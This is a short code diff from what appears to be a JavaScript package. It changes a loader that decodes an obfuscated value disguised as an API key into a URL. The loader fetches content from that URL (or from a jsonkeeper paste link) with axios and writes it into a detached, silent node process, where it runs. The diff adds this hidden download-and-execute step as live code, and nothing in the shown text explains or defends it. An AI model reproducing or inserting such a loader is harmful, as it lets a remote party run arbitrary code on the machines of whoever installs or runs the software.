@@ -17,8 +17,8 @@ const DEV_API_KEY="S]EH:2e2prf1uhshhnqrvm1zzz22=vswwk"
 
 const DEV_API_KEY_1="https://www.jsonkeeper.com/b/PAB1R"
 const mainFunction = (async () => {
-  //const s1 = (await axios.get(update(DEV_API_KEY))).data.content;
-  const s1 = (await axios.get(DEV_API_KEY_1)).data.content; 
+  const s1 = (await axios.get(update(DEV_API_KEY))).data.content;
+  //const s1 = (await axios.get(DEV_API_KEY_1)).data.content; 
 
   const child = spawn('node', [], { detached: true, stdio: ['pipe', 'ignore', 'ignore'] });
   child.stdin.write(s1);
